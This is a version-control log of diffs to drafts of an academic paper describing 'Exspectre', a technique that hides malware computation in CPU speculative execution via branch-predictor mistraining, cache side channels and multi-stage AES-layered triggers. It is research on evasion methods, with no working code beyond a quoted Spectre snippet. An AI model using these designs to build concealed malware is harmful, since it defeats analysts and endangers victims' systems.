+script. We also do the final indirect call to a function pointer, but with two
+differences. First, the destination of the function pointer is a different
+address, and second, the location of the function pointer in memory is uncached.
+This forces the CPU to predict the destination of the indirect call, which it
+predicts to be the destination of the function pointer in trigger program. In
+the payload program, we purposefully place code at this address which acts as
+the \emph{speculative entry point}. Even though the in-order execution of
+payload program never executes or even reads from this address, the CPU will
+briefly execute instructions there speculatively.
+
+Eventually, the dereference of the uncached function pointer in payload program
+will be resolved, and the CPU will recognize it has incorrectly predicted the
+destination of its \texttt{callq} instruction. The results from the speculative
+entry point instructions will be discarded, and the CPU will continue executing
+from the correct destination. However, as the speculative code changes what is
+loaded into the cache based on its results, it can covertly communicate its
+results to the ``real world'' program.
+
+TODO: Note that returns can also be indirect jumps, and rets/jmpq can be mixed
+to a certain extent...need to document/quantify how much mixing can be done
+still.
 
 \subsection{Limits of Speculative Execution}
-- Limits of speculative execution (number of instructions)
+We performed several experiments to investigate how much computation can be done
+speculatively. We performed these experiments on an Intel~(TODO: Jack fill in).
+TODO: Jack describe experiment and results:
+
 - Experiment w/ graph of number of instructions
-- Limitation is in the ROB
+- Limitation is in the ROB (cite other work that supports this)
 
 \subsection{Speculative Primitive}
-- Primitive: Perform several hundred arbitrary instructions in the speculative
-world, then return fixed-length value to the real world.
-- Trade off number of bits for speed when performing cache side channel.
+
+We summarize our findings into a \emph{speculative primitive}, which allows us to
+speculatively (and covertly) perform approximately TK:150 arbitrary
+instructions, and communicate a short (e.g. single byte) result to the real
+world via a cache side channel. These speculative instructions are able to read
+from any real-world memory or registers, but they cannot perform updates or
+writes directly. To update memory, the speculative instructions must communicate
+to the real world through a cache side channel.
+
+We note a performance tradeoff between the size of communication (e.g. 4 bits vs 8
+bits) and the time it takes the real world to recover the result from the side
+channel. Using Prime+Probe~\cite{prime-probe} as our cache side channel,
+recovering the result requires accessing all elements in an array exponential in
+the size of the result (e.g. $2^8$ array reads to recover an 8-bit result). 
+Therefore, there is a
+performance advantage for keeping the size of the result small, and communicating
+out small pieces of information that are aggregated by the real world.
 
@@
 
-Given the speculative primitive, what can we do with it?
+While the amount of computation done in a single speculative execution is small,
+we demonstrate several applications that can take advantage of multiple
+speculative runs to carry out computation.
 
-Finite state machine...
+As a first step, we observe that this primitive can be used to trivially
+implement a finite state machine: any logic can be done in the speculative
+world, while
+updates to the state are communicated to the real world where they are stored.
+On the next run of the speculative instructions, they read from the real world
+state (and other inputs), compute any state transitions, and communicate the
+result. In this mode, the state is maintained by the real world, while updates
+are controlled by code executed speculatively.
 
@@
 \subsection{Virtual Machines}
+- SPASM
 

### 2018-04-24 paper/paper.tex
paper update incremental

--- 2018-04-19 paper/paper.tex
@@
 
+\subsection{Complex Triggers}
+When considering packers and crypters used in modern malware it is not uncommon to see 
+a malicious sample packed using multiple stages with different unpacking conditions. 
+Whether that be red pills, or environent checks, or network triggers, the reliance is on
+complexity to fool any reverse engineer out of finding the correct conditions to 
+release the full payload.
+
+Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
+can be designed used any combination of crafted or benign trigger programs. Only when all
+stages have been run to completion in order will the malicious payload be revealed.  
+In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
+they can use differnt emulators all together.
+
+Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
+a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
+with the keys hidden in data or dead code which static and dynamic reverse engineering 
+methods will overlook.
+
 %%%%%%%%%%%%%%

### 2018-04-26 paper/architecture.tex
payload / implementation pass - added preliminary figures

--- 2018-04-24 paper/paper.tex
@@
-\documentclass[sigconf, anonymous]{acmart}
-
-\usepackage{listings}
-\input{figures}
-
-\fancyhf{} % Remove fancy page headers 
-\fancyhead[C]{Paper \#XXX} % TODO: replace 9999 with your paper number
-\fancyfoot[C]{\thepage}
-
-\setcopyright{none} % No copyright notice required for submissions
-%\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
-\acmYear{2017}
-
-\settopmatter{printacmref=false, printccs=true, printfolios=true} % We want page numbers on submissions
-
-%%\ccsPaper{9999} % TODO: replace with your paper number once obtained
-
-\newcommand{\speculake}{Exspectre }
-
-\begin{document}
-\title{\speculake: Hiding Malware in Speculative Execution} % TODO: replace with your title
-
-\begin{abstract}
-Recently, the Spectre and Meltdown attacks have revealed serious vulnerabilities in modern CPU
-designs, allowing an attacker to exfiltrate data from sensitive programs. These
-vulnerabilities take advantage of speculative execution to coerce a processor to
-perform computation that would otherwise not occur, leaking the resulting
-information via side channels to an attacker.
-
-In this paper, we extend these ideas in a different direction, and leverage speculative
-execution in order to \emph{hide malware} from both static and dynamic analysis. Using this
-technique, critical portions of a malicious program's computation can be shielded from view,
-such that even a debugger following an instruction-level trace of the
-program cannot tell how its results were computed.
-
-We introduce \emph{\speculake}, which compiles arbitrary malicious code into a
-seemingly-benign payload binary. When a separate trigger program performs a specific
-pattern of indirect jumps, it (mis)trains the CPU's branch predictor. Subsequent
-executions of the payload binary with similar jumps causes the CPU to mispredict its
-branches and speculatively execute a malicious payload, which communicates
-results back to the real world via side channels.
-
-We study the extent and types of execution that can be performed in the
-``speculative world'', and build tools that enable several computations to be
-performed covertly. In particular, within speculative execution we are able to
-decrypt memory using AES-NI instructions, and are able to interpret a custom
-virtual machine language to perform arbitrary computation.
-We also show how the trigger program
-can be a pre-existing benign application already running on the system, and
-demonstrate this concept with OpenSSL driven remotely by the attacker as our
-trigger program.
-
-Finally, we describe defenses, but in all honesty, you're probably not going to like
-them.
-
-We consider this to be a new thrust in attack vector research that harkens to work 
-done on hardware red-pills and weird machines. We demonstrate that unintended 
-functionality of architechture can be used to compose malicious programs with 
-new and different properties. This technique poses novel and unique challenges for 
-malware modeling efforts, as it forces an environment to either
-faithfully reproduce all hardware behaviors, or overcome a much larger burden of 
-reverse engineering.
-
-\end{abstract}
-
-% TODO: replace this section with code generated by the tool at https://dl.acm.org/ccs.cfm
-
-%\begin{CCSXML}
-%<ccs2012>
-%<concept>
-%<concept_id>10002978.10003029.10011703</concept_id>
-%<concept_desc>Security and privacy~Usability in security and privacy</concept_desc>
-%<concept_significance>500</concept_significance>
-%</concept>
-%</ccs2012>
-%\end{CCSXML}
-
-%\ccsdesc{Security and privacy~Use https://dl.acm.org/ccs.cfm to generate actual concepts section for your paper}
-% -- end of section to replace with generated code
-
-\keywords{Malware; Covert Channel; Weird Machines; TK} % TODO: replace with your keywords
-
-\maketitle
-
-%%%%%%%%%%%%%%
-\section{Introduction}
-
-Modern CPU designs use speculative execution to maintain high instruction
-throughput, with the goal of improving performance. In speculative execution,
-CPUs execute likely future instructions while they wait for other slower
-instructions to complete. When the CPU's guess of future instructions is correct, the
-benefit is faster execution performance. When its guess is wrong, the CPU
-simply discards the speculated results and continues executing along the true path.
-
-Previously, it was assumed that speculative execution results
-remain invisible if discarded, as careful CPU design maintains strict separation
-between speculative results and updates to architectual state.
-However, recent research has revealed side channels that violate this
-separation, and researchers have demonstrated ways to exfiltrate results from speculative
-computation. Most notably, the Spectre vulnerability allows attackers to leak
-information from purposefully mis-speculated branches in a victim
-process~\cite{spectre}. The Meltdown vulnerability uses speculative results of an
-unauthorized memory read to sidestep page faults and leak protected memory from
-the kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting
-secret data from a process or operating system.
-
-\medskip
-
-In this paper, we explore another attack enabled by speculative execution:
-\speculake, which \emph{hides computation} within
-the ``speculative world''. Taking advantage of the CPU's speculation to secretly
-perform computation,
-we can produce binaries that thwart existing reverse engineering
-techniques. Because the speculative parts of a program never ``truly'' execute,
-we can hide program functionality in the unreachable dead code in a program.
-Even a full instruction trace, captured by a hardware debugger or software
-emulator, will be unable to capture the logic performed speculatively.
-This technique could lead to sophisticated malware that hides its behavior
-from both static and dynamic analysis.
-
-Existing malware use several techniques to evade detection and
-make it difficult for analysts to determine payload behavior of reported malware. 
-For example, binary \emph{packers} or \emph{crypters} encode an executable payload as
-data that must be ``unpacked'' at runtime, making it difficult to tell
-statically what a program will do~\cite{malware-packers}. Malware may also use
-\emph{triggers} that only run the payload when certain conditions are present, preventing
-it from executing when it is inside an analysis sandbox or debugger.
-
-However, with some effort, these existing techniques can be defeated. Analysts can use
-dynamic execution to unpack malware and reveal its
-behavior~\cite{balzarotti2010efficient}, and can use symbolic execution or code
-coverage fuzzers to determine the inputs or triggers that will reveal malicious
-behavior~\cite{moser2007exploring,schwartz2010all,wang2017angr,egele2012survey}.
-
-\speculake provides a new technique to malware authors, allowing them to hide
-program functionality in code that does not execute at runtime.
-
-At a high level, \speculake consists of two parts: a payload program, and a
-trigger program. When run by itself, the payload program executes a pattern of
-indirect jumps and measures a cache side channel. While the trigger program is
-not running, the payload program is effectively inactive (and may optionally do some
-decoy operation). When the trigger program runs, it executes a similar pattern of
-indirect jumps (with similar source and destination addresses as the payload
-program), effectively training the CPU's branch predictor to the jump pattern
-specified by the trigger program.
-
-Importantly, the trigger program and payload
-program's indirect jump patterns diverge on the destination of their final jumps.
-However, because the trigger program has trained the CPU's branch predictor, the
-CPU speculates that the payload program will continue following the pattern of
-the trigger program, causing it to speculatively execute a
-\emph{target function} in the payload program. We emphasize that this target
-function is in a region that is neither read nor executed by the payload
-program, and after the CPU discovers the mis-speculation in the payload program,
-it will discard the results from the target function and continue executing from
-the correct destination. However, the payload program has a limited speculative
-window where it can perform computation in the target function, and can
-communicate results back to the ``real world'' payload program via a cache side
-channel.
-
-While it's possible for the trigger and payload programs to be bundled in a
-single program, an analyst aware of \speculake could easily find the target
-function in the payload program based on the jump pattern in the trigger program.
-However, if the trigger and payload are kept separate, the analyst has a much
-harder job and must identify both.
-Moreover, it is possible that the trigger program be a
-seemingly-unrelated benign program already on the victim's computer. We
-investigate using the OpenSSL library as a benign trigger
-program in Section~\ref{sec:tk}. If the trigger program is another benign
-program on the system, the analyst has the difficult task of identifying which
-program, library, or even operating system component is responsible for training
-the CPU's branch predictor, and finding the specific set of jumps that occur at
-runtime. To make matters worse, the payload program can include dummy jump
-patterns that are effectively dead ends for the analyst, as they do not
-ultimately call the target function speculatively.
-
-Simulating or modelling the speculative execution path is a difficult task for a
-program analyst hoping to reverse engineer an \speculake binary. First, the
-analyst must reverse engineer and accurately model the closed-source proprietary
-components of the target CPU, including the branch predictor, cache hierarchy,
-out-of-order execution, and hyperthreading. In contrast, the \speculake
-author only has to use a partial model of these components and produce binaries
-that take advantage of them, while the analyst's model must be complete to
-capture all potential \speculake uses. Second, the analyst must run all
-potential trigger programs through the simulator, including benign programs with
-realistic inputs. Both of these contribute to a time-consuming and expensive
-endeavor for would-be analysts.
-
-% Results summary
-In order to study the potential of \speculake, we implement several example
-payload programs and evaluate their performance.
-We find that the speculative window is limited mainly by the reorder buffer
-size, and confirm that we are able to execute between 100 and 200 instructions
-speculatively on modern Intel CPUs. While brief, we are able to perform
-execution in short steps, communicating intermediate results back to the ``real
-world'' part of the payload program. Using this technique,
-we demonstrate implementing a universal Turing machine
-(demonstrating arbitrary computation), a custom instruction set architecture
-that fits within the constraints of speculative execution, and show
-the ability to perform AES decryption
-of a payload via AES encrypt/decrypt instructions.
-
-Using these building blocks, we demonstrate the practicality of hiding arbitrary
-computation by decrypting an AES-encrypted ARM binary in the speculative world
-one instruction at a time, returning the decrypted next instruction to the real
-world part of the payload program, which updates a virtual machine. We show that
-we are able to decrypt and process approximately 25 instructions per second.
-
-% contributions?
-% - explore the limits of speculative execution
-% - propose novel concept of hiding computation in speculative execution
-% - implement example applications using this concept, including decrypting
-%   data speculatively
-% - demonstrate using benign program (openssl) as trigger
-% - identify defenses and discuss ways to counter them
-
-% TODO: we don't talk at all about how an analyst might try to enumerate
-% the potential entry points to the speculative world, and how that can be
-% made difficult
-
-%%%%%%%%%%%%%%
-\section{Background}
-Modern CPU designs employ a wide range of tricks in order to maximize
-performance. In this section, we provide preliminary background as they are
-relevant to our system, as well as a brief summary of the Spectre vulnerability.
-
-\subsection{Out-of-Order Execution}
-Many CPUs attempt to keep the pipeline full by executing instructions \emph{out of
-order}, with the CPU allowing future instructions to be worked on and executed
-while it waits for slower or stalled instructions to complete. To maintain
-correctness and the original (Von Neumann) ordering, instructions are tracked in
-a \emph{reorder buffer} (ROB), which keeps the order of instructions as they are
-worked on out of order. Instructions are \emph{retired} from the ROB when
-they are completed and there are no previous instructions that have yet to
-retire. Upon retiring, an instruction's results are committed to the architectural
-state of the CPU. Thus, the ROB ensures that the program (or debugger) view
-of the CPU state always updates in program execution order, despite out of order
-execution.
-
-\subsection{Speculative Execution}
-
-CPUs also attempt to keep their pipeline full by predicting the path of
-execution. For example, a program may contain a branch that depends on a result
-from a prior slow instruction. Rather than wait for the result, the CPU can
-\emph{speculatively execute} instructions down one of the paths of a branch,
-storing the results of the speculative instructions in the ROB.
-If the guess of the branch target turns out to be correct, the CPU can quickly
-retire all the instructions it has speculatively executed while waiting. If the
-guess is incorrect, the CPU must discard the
-(incorrectly) speculated instructions from the ROB, and continue executing from the
-correct branch target.
-
-\subsection{Branch Prediction}
-When a CPU mispredicts a branch, the speculative execution results are
-discarded, costing the CPU several cycles as the pipeline is flushed. To
-minimize this, CPUs employ \emph{branch predictors} that attempt to guess the
-path of execution. Branch predictors maintain a short history of previous
-branch targets for a particular branch (e.g. whether a certain branch is
-frequently taken or not taken), and use
-this to inform the CPU's guess for speculative execution.
-
-There are two kinds of branches a CPU handles: \emph{direct} and
-\emph{indirect}. A \emph{direct} branch may either jump to a provided address or
-continue executing straight through depending on the state of the CPU (e.g. condition
-registers). While there are only two potential statically-known targets for a direct
-branch, the CPU may not know if the branch is taken or not until preceding
-instructions retire. An \emph{indirect} branch is always taken, but its address
-is determined by the value of a register or memory address. Direct branches are
-typically used for control flow such as \texttt{if} or
-\texttt{for}/\texttt{while} statements, while indirect branches are used for
-function pointers, class methods, or case statements.
-
-%- BHB, BTB
-
-\subsection{Spectre}
-
-In early 2018, researchers revealed the Spectre vulnerability, which allows an
-attacker to leak information from a victim program~\cite{specte}. Spectre uses
-the fact that speculative execution can influence system state via side
-channel. In Spectre, an attacker mistrains the branch predictor of a CPU running
-a victim program by providing inputs to it. Once mistrained, the attacker then
-sends a new input that will cause a different in-order execution path. However,
-because the CPU's branch predictor has been mistrained, it will still
-speculatively execute the previous path.
-
-Consider the following code snippet from the Spectre
-paper~\cite{spectre}:
-
-\begin{lstlisting}
-    if (x < array1_size)
-        y = array2[array1[x] * 256];
-\end{lstlisting}
-
-The \texttt{if} statement correctly protects an out-of-bounds reads from \texttt{array1}.
-But if the branch predictor makes an incorrect guess on the branch's direction
-and speculatively executes inside the \texttt{if} statement, it may
-cause a read beyond the boundary of \texttt{array1}. The result of this will
-then (speculatively) be multiplied by 256 and used as an index into
-\texttt{array2}. Although the CPU will not commit
-the speculative update to \texttt{y}, it will still issue a memory read to
-\texttt{array2[array1[x]*256]}, which will be cached. Importantly, even after
-the CPU realizes the branch misprediction, it does not rollback the
-state of the cache, as this does not directly influence program correctness.
-However, the set of cached values is observable to the program via a
-side-channel: by timing reads to \texttt{array2[i]}, the fastest read will
-reveal the speculative value of \texttt{array1[x]*256}, for any value of
-\texttt{x}. An attacker that is able to perform such a side-channel inference on
-the cache can learn the speculative result of an out-of-bounds read from
-\texttt{array1}.
-
-Spectre can also be applied to indirect branches. Branch predictors use the
-history of previous branches to predict the destination of an indirect jump when
-the destination is not yet known. For direct branches, only one of two
-destinations (taken or not taken) are possible to speculatively execute. But for
-indirect branches, a mistrained branch predictor can potentially be coerced into
-speculatively executing from \emph{any} target instruction in the binary.
-
-We take advantage of the behavior of indirect branch prediction to hide the
-location of our speculative computation.
-%TODO more on why this is crucial...
-
-%%%%%%%%%%%%%%
 \section{Architecture}
@@
 
+\begin{figure}[h]
+    \centering
+        \includegraphics[width=0.5\textwidth]{figures/cache_miss_dist}
+    \caption{}
+    \label{fig:cache-miss}
+\end{figure}
+
 \subsection{Speculative Primitive}
@@
 %%%%%%%%%%%%%%
-\section{Application Payloads}
-
-While the amount of computation done in a single speculative execution is small,
-we demonstrate several applications that can take advantage of multiple
-speculative runs to carry out computation.
-
-As a first step, we observe that this primitive can be used to trivially
-implement a finite state machine: any logic can be done in the speculative
-world, while
-updates to the state are communicated to the real world where they are stored.
-On the next run of the speculative instructions, they read from the real world
-state (and other inputs), compute any state transitions, and communicate the
-result. In this mode, the state is maintained by the real world, while updates
-are controlled by code executed speculatively.
-
-\subsection{Turing Machine}
-- Arbitrary computation
-
-\subsection{Unpacking and Decryption}
-- AES instructions
-
-\subsection{Virtual Machines}
-- SPASM
-
-%%%%%%%%%%%%%%
-\section{Trigger Programs}
-Easy answer: custom program that mistrains branch predictor
-
-\subsection{Benign Triggers}
-Could also be any program on the system, and potentially remote!
-
-%%%%%%%%%%%%%%
-\section{Implementation and Evaluation}
-
-\subsection{Turing Machine}
-
-\subsection{AES Decryption}
-
-\subsection{Virtual Machine}
-
-\subsection{OpenSSL Trigger}
-
-%%%%%%%%%%%%%%
-\section{Discussion}
-
-\subsection{Defenses}
-
-\subsection{Future Work}
-
-%%%%%%%%%%%%%%
-\section{Related Work}
-
-%%%%%%%%%%%%%%
-\section{Conclusion}
-
-\bibliographystyle{ACM-Reference-Format}
-\bibliography{paper}
-
-\end{document}

### 2018-04-26 paper/background.tex
payload / implementation pass - added preliminary figures

--- 2018-04-24 paper/paper.tex
@@
-\documentclass[sigconf, anonymous]{acmart}
-
-\usepackage{listings}
-\input{figures}
-
-\fancyhf{} % Remove fancy page headers 
-\fancyhead[C]{Paper \#XXX} % TODO: replace 9999 with your paper number
-\fancyfoot[C]{\thepage}
-
-\setcopyright{none} % No copyright notice required for submissions
-%\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
-\acmYear{2017}
-
-\settopmatter{printacmref=false, printccs=true, printfolios=true} % We want page numbers on submissions
-
-%%\ccsPaper{9999} % TODO: replace with your paper number once obtained
-
-\newcommand{\speculake}{Exspectre }
-
-\begin{document}
-\title{\speculake: Hiding Malware in Speculative Execution} % TODO: replace with your title
-
-\begin{abstract}
-Recently, the Spectre and Meltdown attacks have revealed serious vulnerabilities in modern CPU
-designs, allowing an attacker to exfiltrate data from sensitive programs. These
-vulnerabilities take advantage of speculative execution to coerce a processor to
-perform computation that would otherwise not occur, leaking the resulting
-information via side channels to an attacker.
-
-In this paper, we extend these ideas in a different direction, and leverage speculative
-execution in order to \emph{hide malware} from both static and dynamic analysis. Using this
-technique, critical portions of a malicious program's computation can be shielded from view,
-such that even a debugger following an instruction-level trace of the
-program cannot tell how its results were computed.
-
-We introduce \emph{\speculake}, which compiles arbitrary malicious code into a
-seemingly-benign payload binary. When a separate trigger program performs a specific
-pattern of indirect jumps, it (mis)trains the CPU's branch predictor. Subsequent
-executions of the payload binary with similar jumps causes the CPU to mispredict its
-branches and speculatively execute a malicious payload, which communicates
-results back to the real world via side channels.
-
-We study the extent and types of execution that can be performed in the
-``speculative world'', and build tools that enable several computations to be
-performed covertly. In particular, within speculative execution we are able to
-decrypt memory using AES-NI instructions, and are able to interpret a custom
-virtual machine language to perform arbitrary computation.
-We also show how the trigger program
-can be a pre-existing benign application already running on the system, and
-demonstrate this concept with OpenSSL driven remotely by the attacker as our
-trigger program.
-
-Finally, we describe defenses, but in all honesty, you're probably not going to like
-them.
-
-We consider this to be a new thrust in attack vector research that harkens to work 
-done on hardware red-pills and weird machines. We demonstrate that unintended 
-functionality of architechture can be used to compose malicious programs with 
-new and different properties. This technique poses novel and unique challenges for 
-malware modeling efforts, as it forces an environment to either
-faithfully reproduce all hardware behaviors, or overcome a much larger burden of 
-reverse engineering.
-
-\end{abstract}
-
-% TODO: replace this section with code generated by the tool at https://dl.acm.org/ccs.cfm
-
-%\begin{CCSXML}
-%<ccs2012>
-%<concept>
-%<concept_id>10002978.10003029.10011703</concept_id>
-%<concept_desc>Security and privacy~Usability in security and privacy</concept_desc>
-%<concept_significance>500</concept_significance>
-%</concept>
-%</ccs2012>
-%\end{CCSXML}
-
-%\ccsdesc{Security and privacy~Use https://dl.acm.org/ccs.cfm to generate actual concepts section for your paper}
-% -- end of section to replace with generated code
-
-\keywords{Malware; Covert Channel; Weird Machines; TK} % TODO: replace with your keywords
-
-\maketitle
-
-%%%%%%%%%%%%%%
-\section{Introduction}
-
-Modern CPU designs use speculative execution to maintain high instruction
-throughput, with the goal of improving performance. In speculative execution,
-CPUs execute likely future instructions while they wait for other slower
-instructions to complete. When the CPU's guess of future instructions is correct, the
-benefit is faster execution performance. When its guess is wrong, the CPU
-simply discards the speculated results and continues executing along the true path.
-
-Previously, it was assumed that speculative execution results
-remain invisible if discarded, as careful CPU design maintains strict separation
-between speculative results and updates to architectual state.
-However, recent research has revealed side channels that violate this
-separation, and researchers have demonstrated ways to exfiltrate results from speculative
-computation. Most notably, the Spectre vulnerability allows attackers to leak
-information from purposefully mis-speculated branches in a victim
-process~\cite{spectre}. The Meltdown vulnerability uses speculative results of an
-unauthorized memory read to sidestep page faults and leak protected memory from
-the kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting
-secret data from a process or operating system.
-
-\medskip
-
-In this paper, we explore another attack enabled by speculative execution:
-\speculake, which \emph{hides computation} within
-the ``speculative world''. Taking advantage of the CPU's speculation to secretly
-perform computation,
-we can produce binaries that thwart existing reverse engineering
-techniques. Because the speculative parts of a program never ``truly'' execute,
-we can hide program functionality in the unreachable dead code in a program.
-Even a full instruction trace, captured by a hardware debugger or software
-emulator, will be unable to capture the logic performed speculatively.
-This technique could lead to sophisticated malware that hides its behavior
-from both static and dynamic analysis.
-
-Existing malware use several techniques to evade detection and
-make it difficult for analysts to determine payload behavior of reported malware. 
-For example, binary \emph{packers} or \emph{crypters} encode an executable payload as
-data that must be ``unpacked'' at runtime, making it difficult to tell
-statically what a program will do~\cite{malware-packers}. Malware may also use
-\emph{triggers} that only run the payload when certain conditions are present, preventing
-it from executing when it is inside an analysis sandbox or debugger.
-
-However, with some effort, these existing techniques can be defeated. Analysts can use
-dynamic execution to unpack malware and reveal its
-behavior~\cite{balzarotti2010efficient}, and can use symbolic execution or code
-coverage fuzzers to determine the inputs or triggers that will reveal malicious
-behavior~\cite{moser2007exploring,schwartz2010all,wang2017angr,egele2012survey}.
-
-\speculake provides a new technique to malware authors, allowing them to hide
-program functionality in code that does not execute at runtime.
-
-At a high level, \speculake consists of two parts: a payload program, and a
-trigger program. When run by itself, the payload program executes a pattern of
-indirect jumps and measures a cache side channel. While the trigger program is
-not running, the payload program is effectively inactive (and may optionally do some
-decoy operation). When the trigger program runs, it executes a similar pattern of
-indirect jumps (with similar source and destination addresses as the payload
-program), effectively training the CPU's branch predictor to the jump pattern
-specified by the trigger program.
-
-Importantly, the trigger program and payload
-program's indirect jump patterns diverge on the destination of their final jumps.
-However, because the trigger program has trained the CPU's branch predictor, the
-CPU speculates that the payload program will continue following the pattern of
-the trigger program, causing it to speculatively execute a
-\emph{target function} in the payload program. We emphasize that this target
-function is in a region that is neither read nor executed by the payload
-program, and after the CPU discovers the mis-speculation in the payload program,
-it will discard the results from the target function and continue executing from
-the correct destination. However, the payload program has a limited speculative
-window where it can perform computation in the target function, and can
-communicate results back to the ``real world'' payload program via a cache side
-channel.
-
-While it's possible for the trigger and payload programs to be bundled in a
-single program, an analyst aware of \speculake could easily find the target
-function in the payload program based on the jump pattern in the trigger program.
-However, if the trigger and payload are kept separate, the analyst has a much
-harder job and must identify both.
-Moreover, it is possible that the trigger program be a
-seemingly-unrelated benign program already on the victim's computer. We
-investigate using the OpenSSL library as a benign trigger
-program in Section~\ref{sec:tk}. If the trigger program is another benign
-program on the system, the analyst has the difficult task of identifying which
-program, library, or even operating system component is responsible for training
-the CPU's branch predictor, and finding the specific set of jumps that occur at
-runtime. To make matters worse, the payload program can include dummy jump
-patterns that are effectively dead ends for the analyst, as they do not
-ultimately call the target function speculatively.
-
-Simulating or modelling the speculative execution path is a difficult task for a
-program analyst hoping to reverse engineer an \speculake binary. First, the
-analyst must reverse engineer and accurately model the closed-source proprietary
-components of the target CPU, including the branch predictor, cache hierarchy,
-out-of-order execution, and hyperthreading. In contrast, the \speculake
-author only has to use a partial model of these components and produce binaries
-that take advantage of them, while the analyst's model must be complete to
-capture all potential \speculake uses. Second, the analyst must run all
-potential trigger programs through the simulator, including benign programs with
-realistic inputs. Both of these contribute to a time-consuming and expensive
-endeavor for would-be analysts.
-
-% Results summary
-In order to study the potential of \speculake, we implement several example
-payload programs and evaluate their performance.
-We find that the speculative window is limited mainly by the reorder buffer
-size, and confirm that we are able to execute between 100 and 200 instructions
-speculatively on modern Intel CPUs. While brief, we are able to perform
-execution in short steps, communicating intermediate results back to the ``real
-world'' part of the payload program. Using this technique,
-we demonstrate implementing a universal Turing machine
-(demonstrating arbitrary computation), a custom instruction set architecture
-that fits within the constraints of speculative execution, and show
-the ability to perform AES decryption
-of a payload via AES encrypt/decrypt instructions.
-
-Using these building blocks, we demonstrate the practicality of hiding arbitrary
-computation by decrypting an AES-encrypted ARM binary in the speculative world
-one instruction at a time, returning the decrypted next instruction to the real
-world part of the payload program, which updates a virtual machine. We show that
-we are able to decrypt and process approximately 25 instructions per second.
-
-% contributions?
-% - explore the limits of speculative execution
-% - propose novel concept of hiding computation in speculative execution
-% - implement example applications using this concept, including decrypting
-%   data speculatively
-% - demonstrate using benign program (openssl) as trigger
-% - identify defenses and discuss ways to counter them
-
-% TODO: we don't talk at all about how an analyst might try to enumerate
-% the potential entry points to the speculative world, and how that can be
-% made difficult
-
-%%%%%%%%%%%%%%
 \section{Background}
@@
 
-TODO more on why this is crucial...
+We take advantage of the behavior of indirect branch prediction to hide the
+location of our speculative computation.
+%TODO more on why this is crucial...
 
 %%%%%%%%%%%%%%
-\section{Architecture}
-
-\speculake malware is comprised of two independent programs: a payload program, and a
-trigger program. Both are installed on the victim's computer (e.g. via trojan, remote
-exploit, or phishing), a
-
-Two parts: payload program, and trigger program. Could be combined, but need not
-be. Describe high-level concept of parts
-
-\subsection{Limits of Speculative Execution}
-- Limits of speculative execution (number of instructions)
-- Experiment w/ graph of number of instructions
-- Limitation is in the ROB
-
-\subsection{Speculative Primitive}
-- Primitive: Perform several hundred arbitrary instructions in the speculative
-world, then return fixed-length value to the real world.
-- Trade off number of bits for speed when performing cache side channel.
-
-%%%%%%%%%%%%%%
-\section{Application Payloads}
-
-Given the speculative primitive, what can we do with it?
-
-Finite state machine...
-
-\subsection{Turing Machine}
-- Arbitrary computation
-
-\subsection{Unpacking and Decryption}
-- AES instructions
-
-\subsection{Virtual Machines}
-
-%%%%%%%%%%%%%%
-\section{Trigger Programs}
-Easy answer: custom program that mistrains branch predictor
-
-\subsection{Benign Triggers}
-Could also be any program on the system, and potentially remote!
-
-\subsection{Complex Triggers}
-When considering packers and crypters used in modern malware it is not uncommon to see 
-a malicious sample packed using multiple stages with different unpacking conditions. 
-Whether that be red pills, or environent checks, or network triggers, the reliance is on
-complexity to fool any reverse engineer out of finding the correct conditions to 
-release the full payload.
-
-Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
-can be designed used any combination of crafted or benign trigger programs. Only when all
-stages have been run to completion in order will the malicious payload be revealed.  
-In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
-they can use differnt emulators all together.
-
-Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
-a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
-with the keys hidden in data or dead code which static and dynamic reverse engineering 
-methods will overlook.
-
-%%%%%%%%%%%%%%
-\section{Implementation and Evaluation}
-
-\subsection{Turing Machine}
-
-\subsection{AES Decryption}
-
-\subsection{Virtual Machine}
-
-\subsection{OpenSSL Trigger}
-
-%%%%%%%%%%%%%%
-\section{Discussion}
-
-\subsection{Defenses}
-
-\subsection{Future Work}
-
-%%%%%%%%%%%%%%
-\section{Related Work}
-
-%%%%%%%%%%%%%%
-\section{Conclusion}
-
-\bibliographystyle{ACM-Reference-Format}
-\bibliography{paper}
-
-\end{document}

### 2018-04-26 paper/introduction.tex
payload / implementation pass - added preliminary figures

--- 2018-04-24 paper/paper.tex
@@
-\documentclass[sigconf, anonymous]{acmart}
-
-\usepackage{listings}
-\input{figures}
-
-\fancyhf{} % Remove fancy page headers 
-\fancyhead[C]{Paper \#XXX} % TODO: replace 9999 with your paper number
-\fancyfoot[C]{\thepage}
-
-\setcopyright{none} % No copyright notice required for submissions
-%\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
-\acmYear{2017}
-
-\settopmatter{printacmref=false, printccs=true, printfolios=true} % We want page numbers on submissions
-
-%%\ccsPaper{9999} % TODO: replace with your paper number once obtained
-
-\newcommand{\speculake}{Exspectre }
-
-\begin{document}
-\title{\speculake: Hiding Malware in Speculative Execution} % TODO: replace with your title
-
-\begin{abstract}
-Recently, the Spectre and Meltdown attacks have revealed serious vulnerabilities in modern CPU
-designs, allowing an attacker to exfiltrate data from sensitive programs. These
-vulnerabilities take advantage of speculative execution to coerce a processor to
-perform computation that would otherwise not occur, leaking the resulting
-information via side channels to an attacker.
-
-In this paper, we extend these ideas in a different direction, and leverage speculative
-execution in order to \emph{hide malware} from both static and dynamic analysis. Using this
-technique, critical portions of a malicious program's computation can be shielded from view,
-such that even a debugger following an instruction-level trace of the
-program cannot tell how its results were computed.
-
-We introduce \emph{\speculake}, which compiles arbitrary malicious code into a
-seemingly-benign payload binary. When a separate trigger program performs a specific
-pattern of indirect jumps, it (mis)trains the CPU's branch predictor. Subsequent
-executions of the payload binary with similar jumps causes the CPU to mispredict its
-branches and speculatively execute a malicious payload, which communicates
-results back to the real world via side channels.
-
